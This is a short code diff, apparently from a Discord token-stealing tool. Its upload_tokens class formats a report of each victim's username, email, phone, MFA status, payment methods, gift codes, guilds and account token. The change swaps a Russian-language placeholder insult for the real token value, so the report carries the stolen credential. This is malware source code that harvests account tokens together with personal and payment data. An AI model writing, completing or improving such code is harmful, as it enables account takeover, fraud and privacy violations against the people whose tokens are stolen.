@@ -235,6 +235,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            toReturn += f"Username: {username} ({user_id})\nEmail: {email if email is not None else 'None'}\nPhone: {phone if phone is not None else 'None'}\n2FA/MFA enabled: {mfa}\npayment_methods:{payment_methods if payment_methods is not None else 'None'}\nGift Codes: {codes if codes is not None else 'None'}\nHQ guilds: {hq_guilds if hq_guilds is not None else 'None'}\n\nToken: ПЕРЕЦЬ ЛОХ\n\n"
+            toReturn += f"Username: {username} ({user_id})\nEmail: {email if email is not None else 'None'}\nPhone: {phone if phone is not None else 'None'}\n2FA/MFA enabled: {mfa}\npayment_methods:{payment_methods if payment_methods is not None else 'None'}\nGift Codes: {codes if codes is not None else 'None'}\nHQ guilds: {hq_guilds if hq_guilds is not None else 'None'}\n\nToken: {token}\n\n"
+            #toReturn += f"Username: {username} ({user_id})\nEmail: {email if email is not None else 'None'}\nPhone: {phone if phone is not None else 'None'}\n2FA/MFA enabled: {mfa}\npayment_methods:{payment_methods if payment_methods is not None else 'None'}\nGift Codes: {codes if codes is not None else 'None'}\nHQ guilds: {hq_guilds if hq_guilds is not None else 'None'}\n\nToken: TEST\n\n"
             toReturn += "=" * 40 + "\n"
         return toReturn
